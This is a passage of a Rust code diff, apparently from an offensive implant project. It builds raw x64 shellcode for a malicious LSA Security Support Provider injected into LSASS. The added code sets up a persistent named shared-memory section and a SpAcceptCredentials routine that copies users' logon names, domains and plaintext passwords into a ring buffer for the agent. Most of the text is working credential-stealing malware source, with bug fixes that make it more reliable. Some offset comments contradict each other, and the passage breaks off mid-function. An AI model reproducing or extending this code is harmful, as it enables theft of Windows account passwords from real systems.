@@ -88,7 +88,7 @@ fn generate_shm_name() -> Vec<u16> {
 
     let hkdf = hkdf::Hkdf::<sha2::Sha256>::new(None, psk.as_bytes());
     let mut derived = [0u8; 16];
-    hkdf.expand(b"orchestra-ssp-shm-name", &mut derived)
+    hkdf.expand(common::hkdf_info::SSP_SHM, &mut derived)
         .expect("HKDF expand for SSP SHM name must succeed");
 
     let full = format!("Global\\{}", hex::encode(derived));
@@ -161,77 +161,40 @@ pub struct CredSlot {
 /// table at the start that the LSA SSP loader will call into.
 pub fn build_ssp_blob() -> Result<Vec<u8>> {
     // ── Blob layout ────────────────────────────────────────────────
-    //   0x000: SpInitialize  — stub (xor eax,eax; ret)
-    //   0x020: SpShutDown    — stub (xor eax,eax; ret)
-    //   0x040: SpAcceptCredentials — credential capture shellcode
-    //   0x300: Data section   — section name (UTF-16LE)
-    //   0x400: Function pointer table (pre-resolved ntdll addresses)
+    //   0x000: SpInitialize  — NtCreateSection + NtMapViewOfSection
+    //                         + zero-init + NtUnmapViewOfSection
+    //   ~0x180: SpShutDown   — stub (xor eax,eax; ret)
+    //   ~0x1A0: SpAcceptCredentials — credential capture shellcode
+    //   0x500: Data section   — section name (UTF-16LE)
+    //   0x600: Function pointer table (pre-resolved ntdll addresses)
     //
     // All address references use the call/pop technique to obtain a
     // position-independent anchor.  On Windows 10+, ntdll.dll loads at
     // the same base address in every process, so function pointers
     // resolved in the agent process are valid inside LSASS.
+    //
+    // Function pointer table layout:
+    //   [+0x00] NtCreateSection       (SpInitialize)
+    //   [+0x08] NtOpenSection         (SpAcceptCredentials)
+    //   [+0x10] NtMapViewOfSection    (shared)
+    //   [+0x18] NtUnmapViewOfSection  (shared)
+    //   [+0x20] NtClose               (shared)
 
-    const OFF_DATA: usize = 0x300;
-    const OFF_FT: usize   = 0x400;
+    const OFF_SSP_SHUTDOWN: usize = 0x200;
+    const OFF_DATA: usize = 0x500;
+    const OFF_FT: usize   = 0x600;
 
     let mut blob = Vec::with_capacity(0x800);
 
-    // Jump-patch bookkeeping: (rel32_patch_offset, label_id)
-    let mut near_patches: Vec<(usize, usize)> = Vec::new();
-    let mut label_offsets: [usize; 2] = [0; 2];
-    const L_EPILOGUE: usize = 0;
-    const L_CLOSE:    usize = 1;
+    // Data-section offset where SpInitialize stores the mapped base
+    // address (8 bytes).  Placed well past the UTF-16 section name
+    // (max ~80 bytes for a 39-char name).
+    const OFF_STORED_BASE: usize = 0x80;
 
-    // ═══════════════════════════════════════════════════════════════
-    //  SpInitialize (0x000) — stub: return STATUS_SUCCESS
-    // ═══════════════════════════════════════════════════════════════
-    blob.extend_from_slice(&[0x48, 0x83, 0xEC, 0x28]); // sub rsp, 0x28
-    blob.extend_from_slice(&[0x31, 0xC0]);               // xor eax, eax
-    blob.extend_from_slice(&[0x48, 0x83, 0xC4, 0x28]); // add rsp, 0x28
-    blob.push(0xC3);                                     // ret
-    blob.resize(0x020, 0x90);
-
-    // ═══════════════════════════════════════════════════════════════
-    //  SpShutDown (0x020) — stub: return STATUS_SUCCESS
-    // ═══════════════════════════════════════════════════════════════
-    blob.extend_from_slice(&[0x48, 0x83, 0xEC, 0x28]);
-    blob.extend_from_slice(&[0x31, 0xC0]);
-    blob.extend_from_slice(&[0x48, 0x83, 0xC4, 0x28]);
-    blob.push(0xC3);
-    blob.resize(0x040, 0x90);
-
-
-    // ═══════════════════════════════════════════════════════════════
-    //  SpAcceptCredentials (0x040) — credential capture
-    //
-    //  Windows x64 calling convention:
-    //    rcx = LogonType  (unused)
-    //    rdx = PSESS_PRIMARY_CREDENTIAL (credential struct)
-    //    r8  = Supplemental credentials (unused)
-    //
-    //  PSESS_PRIMARY_CREDENTIAL layout:
-    //    +0x00: UserName  (UNICODE_STRING: u16 Len, u16 Max, u32 pad, u64 Buf)
-    //    +0x10: Domain    (UNICODE_STRING)
-    //    +0x20: Password  (UNICODE_STRING)
-    //
-    //  Register allocation:
-    //    r15 = position-independent anchor (address of pop-r15)
-    //    r14 = mapped section base
-    //    r13 = credential struct pointer (from rdx)
-    //    r12 = temp (UNICODE_STRING buffer pointer)
-    //    rbx = CredSlot base
-    //    rsi/rdi = copy source/dest (for rep movsb)
-    //
-    //  Stack frame (after sub rsp, 0x108):
-    //    [rsp+0x00..0x1F]  shadow space (32)
-    //    [rsp+0x20..0x4F]  stack params  (48, reused per call)
-    //    [rsp+0x50]        SectionHandle (8)
-    //    [rsp+0x58]        BaseAddress   (8)
-    //    [rsp+0x60]        ViewSize      (8)
-    //    [rsp+0x68..0x77]  UNICODE_STRING for section name (16)
-    //    [rsp+0x78..0xA7]  OBJECT_ATTRIBUTES (48)
-    // ═══════════════════════════════════════════════════════════════
+    // SpInitialize-specific jump-patch bookkeeping
+    let mut init_near_patches: Vec<(usize, usize)> = Vec::new();
+    let mut init_label_offsets: [usize; 1] = [0; 1];
+    const L_INIT_EPILOGUE: usize = 0;
 
     // ── Prologue ──────────────────────────────────────────────────
     blob.extend_from_slice(&[0x55]);                         // push rbp
@@ -244,41 +207,33 @@ pub fn build_ssp_blob() -> Result<Vec<u8>> {
     blob.extend_from_slice(&[0x41, 0x57]);                   // push r15
     blob.extend_from_slice(&[0x48, 0x81, 0xEC]);             // sub rsp, 0x108
     blob.extend_from_slice(&0x108u32.to_le_bytes());
-    blob.extend_from_slice(&[0x4D, 0x89, 0xC5]);             // mov r13, r8
+
     // Get position-independent anchor: call $+5; pop r15
     blob.extend_from_slice(&[0xE8, 0x00, 0x00, 0x00, 0x00]); // call $+5
     blob.extend_from_slice(&[0x41, 0x5F]);                   // pop r15
-    // r15 = address of the pop-r15 instruction
-    let r15_off = blob.len() - 2;
+    let r15_off_init = blob.len() - 2;
 
-    // Deltas from r15 to key blob offsets
-    let d_data = (OFF_DATA - r15_off) as u32;
-    let d_ft0  = (OFF_FT      - r15_off) as u32; // NtOpenSection
-    let d_ft1  = (OFF_FT +  8 - r15_off) as u32; // NtMapViewOfSection
-    let d_ft2  = (OFF_FT + 16 - r15_off) as u32; // NtUnmapViewOfSection
-    let d_ft3  = (OFF_FT + 24 - r15_off) as u32; // NtClose
+    // Deltas from r15 to key blob offsets for SpInitialize
+    let d_data_init  = (OFF_DATA         - r15_off_init) as u32;
+    let d_ft_create  = (OFF_FT           - r15_off_init) as u32; // NtCreateSection
+    let d_ft_map_i   = (OFF_FT + 0x10    - r15_off_init) as u32; // NtMapViewOfSection
 
-    // ── Validate credential pointer ───────────────────────────────
-    blob.extend_from_slice(&[0x4D, 0x85, 0xED]);             // test r13, r13
-    // jz epilogue (near, patched later)
-    let jz_cred_patch = blob.len() + 2;
-    blob.extend_from_slice(&[0x0F, 0x84, 0x00, 0x00, 0x00, 0x00]);
-    near_patches.push((jz_cred_patch, L_EPILOGUE));
-
-    // ── Zero the stack frame (264 bytes = 33 qwords) ──────────────
+    // ── Zero the stack frame (33 qwords) ──────────────────────────
     blob.extend_from_slice(&[0x31, 0xC0]);                           // xor eax, eax
     blob.extend_from_slice(&[0xB9, 0x21, 0x00, 0x00, 0x00]);        // mov ecx, 33
     blob.extend_from_slice(&[0x48, 0x89, 0xE7]);                     // mov rdi, rsp
     blob.extend_from_slice(&[0xF3, 0x48, 0xAB]);                     // rep stosq
 
     // ── Build UNICODE_STRING at [rsp+0x68] ────────────────────────
+    // (Name bytes are resolved later when SHM_NAME is available, but the
+    //  length constants are computed from SHM_NAME here for both functions.)
     let shm_name = &*SHM_NAME;
     let name_chars = shm_name.len() - 1; // exclude null terminator
     let name_byte_len = (name_chars * 2) as u16;
 
-    // Buffer = r15 + d_data (address of name bytes in the blob)
-    blob.extend_from_slice(&[0x49, 0x8D, 0x87]);             // lea rax, [r15+d_data]
-    blob.extend_from_slice(&d_data.to_le_bytes());
+    // Buffer = r15 + d_data_init (address of name bytes in the blob)
+    blob.extend_from_slice(&[0x49, 0x8D, 0x87]);             // lea rax, [r15+d_data_init]
+    blob.extend_from_slice(&d_data_init.to_le_bytes());
     blob.extend_from_slice(&[0x48, 0x89, 0x44, 0x24, 0x70]); // mov [rsp+0x70], rax
     blob.extend_from_slice(&[0x66, 0xC7, 0x44, 0x24, 0x68]); // mov word [rsp+0x68], len
     blob.extend_from_slice(&name_byte_len.to_le_bytes());
@@ -292,28 +247,58 @@ pub fn build_ssp_blob() -> Result<Vec<u8>> {
     blob.extend_from_slice(&[0x48, 0x89, 0x43, 0x10]);        // mov [rbx+0x10], rax
     blob.extend_from_slice(&[0xC7, 0x43, 0x18, 0x40, 0x00, 0x00, 0x00]); // mov dword [rbx+0x18], 0x40
 
-    // ── NtOpenSection(&handle, SECTION_MAP_RW, &obj_attr) ─────────
-    blob.extend_from_slice(&[0x49, 0x8D, 0x87]);             // lea rax, [r15+d_ft0]
-    blob.extend_from_slice(&d_ft0.to_le_bytes());
+    // ── Build LARGE_INTEGER SectionSize at [rsp+0xA8] ─────────────
+    // SHM_SIZE = 16 + RING_CAPACITY * CRED_SLOT_SIZE
+    blob.extend_from_slice(&[0x48, 0xC7, 0x44, 0x24, 0xA8]); // mov qword [rsp+0xA8], imm32
+    blob.extend_from_slice(&(SHM_SIZE as u32).to_le_bytes());
+
+    // ── NtCreateSection(&handle, SECTION_ALL_ACCESS, &obj_attr,
+    //                    &section_size, PAGE_READWRITE, SEC_COMMIT, NULL) ──
+    // Stack params (5th–7th):
+    blob.extend_from_slice(&[0xC7, 0x44, 0x24, 0x20,
+                             0x04, 0x00, 0x00, 0x00]);         // [rsp+0x20] SectionPageProtection = PAGE_READWRITE
+    blob.extend_from_slice(&[0xC7, 0x44, 0x24, 0x28,
+                             0x00, 0x00, 0x00, 0x08]);         // [rsp+0x28] AllocationAttributes = SEC_COMMIT (0x08000000)
+    blob.extend_from_slice(&[0x48, 0xC7, 0x44, 0x24, 0x30,
+                             0x00, 0x00, 0x00, 0x00]);         // [rsp+0x30] FileHandle = NULL
+
+    // Load NtCreateSection function pointer
+    blob.extend_from_slice(&[0x49, 0x8D, 0x87]);             // lea rax, [r15+d_ft_create]
+    blob.extend_from_slice(&d_ft_create.to_le_bytes());
     blob.extend_from_slice(&[0x48, 0x8B, 0x00]);             // mov rax, [rax]
     blob.extend_from_slice(&[0x48, 0x85, 0xC0]);             // test rax, rax
     // jz epilogue (near)
-    let jz_open_patch = blob.len() + 2;
+    let jz_create_patch = blob.len() + 2;
     blob.extend_from_slice(&[0x0F, 0x84, 0x00, 0x00, 0x00, 0x00]);
-    near_patches.push((jz_open_patch, L_EPILOGUE));
-    blob.extend_from_slice(&[0x48, 0x8D, 0x4C, 0x24, 0x50]); // lea rcx, [rsp+0x50]
-    blob.extend_from_slice(&[0xBA, 0x06, 0x00, 0x00, 0x00]); // mov edx, 0x0006
-    blob.extend_from_slice(&[0x4C, 0x8D, 0x44, 0x24, 0x78]); // lea r8, [rsp+0x78]
+    init_near_patches.push((jz_create_patch, L_INIT_EPILOGUE));
+
+    // Register params
+    blob.extend_from_slice(&[0x48, 0x8D, 0x4C, 0x24, 0x50]); // lea rcx, [rsp+0x50] &SectionHandle
+    blob.extend_from_slice(&[0xBA, 0x1F, 0x00, 0x0F, 0x00]); // mov edx, SECTION_ALL_ACCESS (0x000F001F)
+    blob.extend_from_slice(&[0x4C, 0x8D, 0x44, 0x24, 0x78]); // lea r8, [rsp+0x78]  &ObjectAttributes
+    blob.extend_from_slice(&[0x4C, 0x8D, 0x8C, 0x24,
+                             0xA8, 0x00, 0x00, 0x00]);         // lea r9, [rsp+0xA8] &SectionSize
     blob.extend_from_slice(&[0xFF, 0xD0]);                     // call rax
     blob.extend_from_slice(&[0x85, 0xC0]);                     // test eax, eax
     // js epilogue (near)
-    let js_open_patch = blob.len() + 2;
+    let js_create_patch = blob.len() + 2;
     blob.extend_from_slice(&[0x0F, 0x88, 0x00, 0x00, 0x00, 0x00]);
-    near_patches.push((js_open_patch, L_EPILOGUE));
+    init_near_patches.push((js_create_patch, L_INIT_EPILOGUE));
 
-    // ── NtMapViewOfSection(10 params) ─────────────────────────────
-    // Stack params (5th-10th): CommitSize=0, SectionOffset=NULL,
-    //   &ViewSize, InheritDisposition=1, AllocationType=0, Protect=4
+    // Check SectionHandle
+    blob.extend_from_slice(&[0x48, 0x8B, 0x5C, 0x24, 0x50]); // mov rbx, [rsp+0x50]
+    blob.extend_from_slice(&[0x48, 0x85, 0xDB]);             // test rbx, rbx
+    // jz epilogue (near)
+    let jz_handle_patch = blob.len() + 2;
+    blob.extend_from_slice(&[0x0F, 0x84, 0x00, 0x00, 0x00, 0x00]);
+    init_near_patches.push((jz_handle_patch, L_INIT_EPILOGUE));
+
+    // ── NtMapViewOfSection(10 params) — map to zero-init ──────────
+    // Set ViewSize = SHM_SIZE at [rsp+0x60]
+    blob.extend_from_slice(&[0x48, 0xC7, 0x44, 0x24, 0x60]); // mov qword [rsp+0x60], SHM_SIZE
+    blob.extend_from_slice(&(SHM_SIZE as u32).to_le_bytes());
+
+    // Stack params (5th–10th):
     blob.extend_from_slice(&[0x48, 0xC7, 0x44, 0x24, 0x20,
                              0x00, 0x00, 0x00, 0x00]);         // [rsp+0x20] CommitSize = 0
     blob.extend_from_slice(&[0x48, 0xC7, 0x44, 0x24, 0x28,
@@ -325,10 +310,11 @@ pub fn build_ssp_blob() -> Result<Vec<u8>> {
     blob.extend_from_slice(&[0x48, 0xC7, 0x44, 0x24, 0x40,
                              0x00, 0x00, 0x00, 0x00]);         // [rsp+0x40] AllocationType = 0
     blob.extend_from_slice(&[0x48, 0xC7, 0x44, 0x24, 0x48,
-                             0x04, 0x00, 0x00, 0x00]);         // [rsp+0x48] Win32Protect = 4
-    // Load function pointer
-    blob.extend_from_slice(&[0x49, 0x8D, 0x87]);             // lea rax, [r15+d_ft1]
-    blob.extend_from_slice(&d_ft1.to_le_bytes());
+                             0x04, 0x00, 0x00, 0x00]);         // [rsp+0x48] Win32Protect = PAGE_READWRITE
+
+    // Load NtMapViewOfSection
+    blob.extend_from_slice(&[0x49, 0x8D, 0x87]);             // lea rax, [r15+d_ft_map_i]
+    blob.extend_from_slice(&d_ft_map_i.to_le_bytes());
     blob.extend_from_slice(&[0x48, 0x8B, 0x00]);             // mov rax, [rax]
     // Register params
     blob.extend_from_slice(&[0x48, 0x8B, 0x4C, 0x24, 0x50]); // mov rcx, [rsp+0x50] SectionHandle
@@ -338,120 +324,45 @@ pub fn build_ssp_blob() -> Result<Vec<u8>> {
     blob.extend_from_slice(&[0x45, 0x31, 0xC9]);             // xor r9d, r9d  ZeroBits=0
     blob.extend_from_slice(&[0xFF, 0xD0]);                     // call rax
     blob.extend_from_slice(&[0x85, 0xC0]);                     // test eax, eax
-    // js close (near)
-    let js_map_patch = blob.len() + 2;
+    // js epilogue (near) — on failure, jump to epilogue (no cleanup needed)
+    let js_map_init_patch = blob.len() + 2;
     blob.extend_from_slice(&[0x0F, 0x88, 0x00, 0x00, 0x00, 0x00]);
-    near_patches.push((js_map_patch, L_CLOSE));
+    init_near_patches.push((js_map_init_patch, L_INIT_EPILOGUE));
 
     // Load mapped base address
     blob.extend_from_slice(&[0x4C, 0x8B, 0x74, 0x24, 0x58]); // mov r14, [rsp+0x58]
     blob.extend_from_slice(&[0x4D, 0x85, 0xF6]);             // test r14, r14
-    // jz close (near)
-    let jz_base_patch = blob.len() + 2;
+    // jz epilogue (near)
+    let jz_base_init_patch = blob.len() + 2;
     blob.extend_from_slice(&[0x0F, 0x84, 0x00, 0x00, 0x00, 0x00]);
-    near_patches.push((jz_base_patch, L_CLOSE));
+    init_near_patches.push((jz_base_init_patch, L_INIT_EPILOGUE));
 
-    // ── Read ring buffer header -> compute slot address ────────────
-    blob.extend_from_slice(&[0x41, 0x8B, 0x06]);             // mov eax, [r14]  write_index
-    blob.extend_from_slice(&[0x89, 0xC1]);                     // mov ecx, eax
-    blob.extend_from_slice(&[0x83, 0xE1, 0xFF]);             // and ecx, 0xFF   mod 256
-    blob.extend_from_slice(&[0x69, 0xC9, 0x08, 0x01,
-                             0x00, 0x00]);                     // imul ecx, ecx, 264
-    blob.extend_from_slice(&[0x49, 0x8D, 0x5E, 0x10]);       // lea rbx, [r14+16]
-    blob.extend_from_slice(&[0x48, 0x03, 0xD9]);             // add rbx, rcx
-
-    // ── Zero the slot (33 qwords = 264 bytes) ─────────────────────
-    blob.extend_from_slice(&[0x48, 0x89, 0xDF]);             // mov rdi, rbx
+    // ── Zero the entire shared memory section ─────────────────────
+    // SHM_SIZE / 8 qwords — ensures header and all slots are zeroed.
+    // Although SEC_COMMIT pages are zeroed by the OS, we zero explicitly
+    // to be safe against stale page-file contents.
+    blob.extend_from_slice(&[0xB9]);                           // mov ecx, SHM_SIZE / 8
+    blob.extend_from_slice(&(SHM_SIZE as u32 / 8).to_le_bytes());
+    blob.extend_from_slice(&[0x48, 0x89, 0xF7]);             // mov rdi, r14
     blob.extend_from_slice(&[0x31, 0xC0]);                     // xor eax, eax
-    blob.extend_from_slice(&[0xB9, 0x21, 0x00, 0x00, 0x00]); // mov ecx, 33
     blob.extend_from_slice(&[0xF3, 0x48, 0xAB]);             // rep stosq
 
-    // ── Copy UserName (UNICODE_STRING at r13+0x08) ────────────────
-    blob.extend_from_slice(&[0x4D, 0x8B, 0x65, 0x10]);       // mov r12, [r13+0x10]
-    blob.extend_from_slice(&[0x4D, 0x85, 0xE4]);             // test r12, r12
-    blob.extend_from_slice(&[0x74, 0x1F]);                     // jz skip_username (31 bytes)
-    blob.extend_from_slice(&[0x41, 0x0F, 0xB7, 0x45, 0x08]); // movzx eax, word [r13+0x08]
-    blob.extend_from_slice(&[0x85, 0xC0]);                     // test eax, eax
-    blob.extend_from_slice(&[0x74, 0x16]);                     // jz skip_username
-    blob.extend_from_slice(&[0x3D, 0x80, 0x00, 0x00, 0x00]); // cmp eax, 128
-    blob.extend_from_slice(&[0x76, 0x05]);                     // jbe +5
-    blob.extend_from_slice(&[0xB8, 0x80, 0x00, 0x00, 0x00]); // mov eax, 128
-    blob.extend_from_slice(&[0x89, 0xC1]);                     // mov ecx, eax
-    blob.extend_from_slice(&[0x4C, 0x89, 0xE6]);             // mov rsi, r12
-    blob.extend_from_slice(&[0x48, 0x89, 0xDF]);             // mov rdi, rbx
-    blob.extend_from_slice(&[0xF3, 0xA4]);                     // rep movsb
-    // skip_username:
+    // ── Store the mapped base address at OFF_DATA + OFF_STORED_BASE ──
+    // V3-04 fix: SpAcceptCredentials reads the base from this location
+    // instead of re-opening the section via NtOpenSection.  The mapping
+    // is kept alive for the lifetime of the SSP.
+    let d_stored_base = (OFF_DATA + OFF_STORED_BASE - r15_off_init) as u32;
+    // mov [r15+d_stored_base], r14
+    blob.extend_from_slice(&[0x4D, 0x89, 0xB7]);             // mov [r15+disp32], r14
+    blob.extend_from_slice(&d_stored_base.to_le_bytes());
 
-    // ── Copy Domain (UNICODE_STRING at r13+0x18) ──────────────────
-    blob.extend_from_slice(&[0x4D, 0x8B, 0x65, 0x20]);       // mov r12, [r13+0x20]
-    blob.extend_from_slice(&[0x4D, 0x85, 0xE4]);             // test r12, r12
-    blob.extend_from_slice(&[0x74, 0x20]);                     // jz skip_domain (32 bytes)
-    blob.extend_from_slice(&[0x41, 0x0F, 0xB7, 0x45, 0x18]); // movzx eax, word [r13+0x18]
-    blob.extend_from_slice(&[0x85, 0xC0]);                     // test eax, eax
-    blob.extend_from_slice(&[0x74, 0x17]);                     // jz skip_domain
-    blob.extend_from_slice(&[0x3D, 0x80, 0x00, 0x00, 0x00]); // cmp eax, 128
-    blob.extend_from_slice(&[0x76, 0x05]);                     // jbe +5
-    blob.extend_from_slice(&[0xB8, 0x80, 0x00, 0x00, 0x00]); // mov eax, 128
-    blob.extend_from_slice(&[0x89, 0xC1]);                     // mov ecx, eax
-    blob.extend_from_slice(&[0x4C, 0x89, 0xE6]);             // mov rsi, r12
-    blob.extend_from_slice(&[0x48, 0x8D, 0x7B, 0x40]);       // lea rdi, [rbx+64]
-    blob.extend_from_slice(&[0xF3, 0xA4]);                     // rep movsb
-    // skip_domain:
-
-    // ── Copy Password (UNICODE_STRING at r13+0x28) ────────────────
-    blob.extend_from_slice(&[0x4D, 0x8B, 0x65, 0x30]);       // mov r12, [r13+0x30]
-    blob.extend_from_slice(&[0x4D, 0x85, 0xE4]);             // test r12, r12
-    blob.extend_from_slice(&[0x74, 0x23]);                     // jz skip_password (35 bytes)
-    blob.extend_from_slice(&[0x41, 0x0F, 0xB7, 0x45, 0x28]); // movzx eax, word [r13+0x28]
-    blob.extend_from_slice(&[0x85, 0xC0]);                     // test eax, eax
-    blob.extend_from_slice(&[0x74, 0x1A]);                     // jz skip_password
-    blob.extend_from_slice(&[0x3D, 0x00, 0x01, 0x00, 0x00]); // cmp eax, 256
-    blob.extend_from_slice(&[0x76, 0x05]);                     // jbe +5
-    blob.extend_from_slice(&[0xB8, 0x00, 0x01, 0x00, 0x00]); // mov eax, 256
-    blob.extend_from_slice(&[0x89, 0xC1]);                     // mov ecx, eax
-    blob.extend_from_slice(&[0x4C, 0x89, 0xE6]);             // mov rsi, r12
-    blob.extend_from_slice(&[0x48, 0x8D, 0xBB,
-                             0x80, 0x00, 0x00, 0x00]);         // lea rdi, [rbx+128]
-    blob.extend_from_slice(&[0xF3, 0xA4]);                     // rep movsb
-    // skip_password:
-
-    // ── Set flags = FLAG_PLAINTEXT (cred_type=0 already from zeroing) ──
-    blob.extend_from_slice(&[0xFF, 0x83, 0x04, 0x01,
-                             0x00, 0x00]);                     // inc dword [rbx+0x104]
-
-    // ── Update ring buffer header ─────────────────────────────────
-    // write_index = (old + 1) % 256
-    blob.extend_from_slice(&[0x41, 0x8B, 0x06]);             // mov eax, [r14]
-    blob.extend_from_slice(&[0xFF, 0xC0]);                     // inc eax
-    blob.extend_from_slice(&[0x0F, 0xB6, 0xC0]);             // movzx eax, al
-    blob.extend_from_slice(&[0x41, 0x89, 0x06]);             // mov [r14], eax
-    // count++
-    blob.extend_from_slice(&[0x41, 0xFF, 0x46, 0x08]);       // inc dword [r14+8]
-
-    // ── NtUnmapViewOfSection(-1, r14) ─────────────────────────────
-    blob.extend_from_slice(&[0x49, 0x8D, 0x87]);             // lea rax, [r15+d_ft2]
-    blob.extend_from_slice(&d_ft2.to_le_bytes());
-    blob.extend_from_slice(&[0x48, 0x8B, 0x00]);             // mov rax, [rax]
-    blob.extend_from_slice(&[0x48, 0x85, 0xC0]);             // test rax, rax
-    blob.extend_from_slice(&[0x74, 0x0E]);                     // jz +14 (skip to close)
-    blob.extend_from_slice(&[0x48, 0xC7, 0xC1,
-                             0xFF, 0xFF, 0xFF, 0xFF]);         // mov rcx, -1
-    blob.extend_from_slice(&[0x4C, 0x89, 0xF2]);             // mov rdx, r14
-    blob.extend_from_slice(&[0xFF, 0xD0]);                     // call rax
-
-    // ── close: NtClose(sectionHandle) ─────────────────────────────
-    label_offsets[L_CLOSE] = blob.len();
-    blob.extend_from_slice(&[0x49, 0x8D, 0x87]);             // lea rax, [r15+d_ft3]
-    blob.extend_from_slice(&d_ft3.to_le_bytes());
-    blob.extend_from_slice(&[0x48, 0x8B, 0x00]);             // mov rax, [rax]
-    blob.extend_from_slice(&[0x48, 0x85, 0xC0]);             // test rax, rax
-    blob.extend_from_slice(&[0x74, 0x04]);                     // jz +4 (skip to epilogue)
-    blob.extend_from_slice(&[0x48, 0x8B, 0x4C, 0x24, 0x50]); // mov rcx, [rsp+0x50]
-    blob.extend_from_slice(&[0xFF, 0xD0]);                     // call rax
-
-    // ── epilogue ──────────────────────────────────────────────────
-    label_offsets[L_EPILOGUE] = blob.len();
-    blob.extend_from_slice(&[0x31, 0xC0]);                     // xor eax, eax
+    // ── epilogue (NO unmap, NO close — section stays alive) ───────
+    // V3-04 fix: we intentionally skip NtUnmapViewOfSection and NtClose
+    // here.  The mapping and handle must persist so that:
+    //   (a) the named section object remains in the NT namespace, and
+    //   (b) SpAcceptCredentials can read the stored base address.
+    init_label_offsets[L_INIT_EPILOGUE] = blob.len();
+    blob.extend_from_slice(&[0x31, 0xC0]);                     // xor eax, eax  (STATUS_SUCCESS)
     blob.extend_from_slice(&[0x48, 0x81, 0xC4]);             // add rsp, 0x108
     blob.extend_from_slice(&0x108u32.to_le_bytes());
     blob.extend_from_slice(&[0x41, 0x5F]);                     // pop r15
@@ -464,22 +375,324 @@ pub fn build_ssp_blob() -> Result<Vec<u8>> {
     blob.extend_from_slice(&[0x5D]);                         // pop rbp
     blob.push(0xC3);                                         // ret
 
-    // ── Patch near jumps ──────────────────────────────────────────
-    for &(patch_off, lbl) in &near_patches {
-        let target = label_offsets[lbl];
+    // ── Patch near jumps for SpInitialize ─────────────────────────
+    for &(patch_off, lbl) in &init_near_patches {
+        let target = init_label_offsets[lbl];
         let rel32 = (target as i32) - (patch_off as i32 + 4);
         blob[patch_off..patch_off + 4].copy_from_slice(&rel32.to_le_bytes());
     }
 
-    // ── Data section (0x300) ──────────────────────────────────────
+    // Pad to SpShutDown boundary
+    blob.resize(OFF_SSP_SHUTDOWN, 0x90);
+
+    // ═══════════════════════════════════════════════════════════════
+    //  SpShutDown (OFF_SSP_SHUTDOWN) — stub: return STATUS_SUCCESS
+    // ═══════════════════════════════════════════════════════════════
+    blob.extend_from_slice(&[0x48, 0x83, 0xEC, 0x28]); // sub rsp, 0x28
+    blob.extend_from_slice(&[0x31, 0xC0]);               // xor eax, eax
+    blob.extend_from_slice(&[0x48, 0x83, 0xC4, 0x28]); // add rsp, 0x28
+    blob.push(0xC3);                                     // ret
+
+
+    // ═══════════════════════════════════════════════════════════════
+    //  SpAcceptCredentials (~0x040) — credential capture
+    //
+    //  Windows x64 calling convention:
+    //    rcx = LogonType  (unused)
+    //    rdx = PSECPKG_PRIMARY_CREDENTIALS (credential struct)
+    //    r8  = Supplemental credentials (unused)
+    //
+    //  V3-01 fix: LSA passes PSECPKG_PRIMARY_CREDENTIALS (with S),
+    //  which contains *pointers* to UNICODE_STRING, not embedded
+    //  UNICODE_STRING structs.  Layout:
+    //    +0x00: LogonId           (LUID: 8 bytes)
+    //    +0x08: DownlevelName     (PUNICODE_STRING → pointer)
+    //    +0x10: DomainName        (PUNICODE_STRING → pointer)
+    //    +0x18: Password          (PUNICODE_STRING → pointer)
+    //
+    //  Each pointer targets a UNICODE_STRING:
+    //    +0x00: Length   (u16)
+    //    +0x02: MaxLength(u16)
+    //    +0x08: Buffer   (PWSTR → pointer to wide chars)
+    //
+    //  V3-05 fix: Ring buffer slot acquisition uses lock xadd for
+    //  atomic fetch-and-increment of write_index, eliminating the
+    //  TOCTOU race between lock inc and the non-atomic mask.
+    //
+    //  The mapped base address is read from OFF_DATA + OFF_STORED_BASE
+    //  (written by SpInitialize during SSP load).  No NtOpenSection or
+    //  NtMapViewOfSection calls are needed.
+    //
+    //  Register allocation:
+    //    r15 = position-independent anchor (address of pop-r15)
+    //    r14 = mapped section base (from stored base address)
+    //    r13 = credential struct pointer (from rdx)
+    //    r12 = temp (UNICODE_STRING pointer / buffer pointer)
+    //    rbx = CredSlot base
+    //    rsi/rdi = copy source/dest (for rep movsb)
+    //
+    //  Stack frame (after sub rsp, 0x28): minimal — only shadow space
+    //  since we no longer call NT APIs.
+    // ═══════════════════════════════════════════════════════════════
+
+    // ── Prologue ──────────────────────────────────────────────────
+    blob.extend_from_slice(&[0x55]);                         // push rbp
+    blob.extend_from_slice(&[0x53]);                         // push rbx
+    blob.extend_from_slice(&[0x56]);                         // push rsi
+    blob.extend_from_slice(&[0x57]);                         // push rdi
+    blob.extend_from_slice(&[0x41, 0x54]);                   // push r12
+    blob.extend_from_slice(&[0x41, 0x55]);                   // push r13
+    blob.extend_from_slice(&[0x41, 0x56]);                   // push r14
+    blob.extend_from_slice(&[0x41, 0x57]);                   // push r15
+    blob.extend_from_slice(&[0x48, 0x81, 0xEC]);             // sub rsp, 0x28
+    blob.extend_from_slice(&0x28u32.to_le_bytes());
+    blob.extend_from_slice(&[0x49, 0x89, 0xD5]);             // mov r13, rdx  (2nd param)
+    // Get position-independent anchor: call $+5; pop r15
+    blob.extend_from_slice(&[0xE8, 0x00, 0x00, 0x00, 0x00]); // call $+5
+    blob.extend_from_slice(&[0x41, 0x5F]);                   // pop r15
+    let r15_off = blob.len() - 2;
+
+    // Delta from r15 to the stored base address in the data section
+    let d_stored_base = (OFF_DATA + OFF_STORED_BASE - r15_off) as u32;
+
+    // ── Validate credential pointer ───────────────────────────────
+    blob.extend_from_slice(&[0x4D, 0x85, 0xED]);             // test r13, r13
+    // jz epilogue (short, +0)
+    // We'll emit a near jz; patch target later.  Use the same
+    // label-patching scheme as SpInitialize.
+    let cred_jz_epilogue = blob.len() + 2;
+    // Placeholder: jz rel32 (6 bytes)
+    blob.extend_from_slice(&[0x0F, 0x84, 0x00, 0x00, 0x00, 0x00]);
+
+    // ── Load mapped base address from stored location ──────────────
+    // V3-04 fix: SpInitialize stored the base at OFF_DATA + OFF_STORED_BASE.
+    // No NtOpenSection/NtMapViewOfSection calls needed.
+    // mov r14, [r15+d_stored_base]
+    blob.extend_from_slice(&[0x49, 0x8B, 0xB7]);             // mov r14, [r15+disp32]
+    blob.extend_from_slice(&d_stored_base.to_le_bytes());
+    blob.extend_from_slice(&[0x4D, 0x85, 0xF6]);             // test r14, r14
+    // jz epilogue (near) — if base is NULL, SpInitialize must have failed
+    let base_jz_epilogue = blob.len() + 2;
+    blob.extend_from_slice(&[0x0F, 0x84, 0x00, 0x00, 0x00, 0x00]);
+
+    // ── Atomically acquire a slot via lock xadd ────────────────────
+    // V3-05 fix: use lock xadd to atomically fetch the old write_index
+    // and increment it by 1 in a single operation.  This eliminates the
+    // TOCTOU race between the old lock inc and the subsequent non-atomic
+    // mask+store.
+    //
